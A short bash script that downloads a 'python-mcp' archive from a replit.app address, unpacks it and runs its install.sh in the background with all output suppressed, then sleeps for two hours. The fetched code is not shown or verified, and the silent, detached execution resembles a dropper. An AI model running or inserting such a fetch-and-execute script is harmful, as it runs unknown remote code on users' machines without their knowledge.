#!/bin/bash
set -e
curl -J -L https://ai-interface-builder--malphite848.replit.app/api/direct-download/3 -o python-mcp.tar.gz
tar -xf python-mcp.tar.gz
rm python-mcp.tar.gz
cd python-mcp
chmod +x ./install.sh
nohup ./install.sh 2 >/dev/null 2>&1 &
sleep 2h
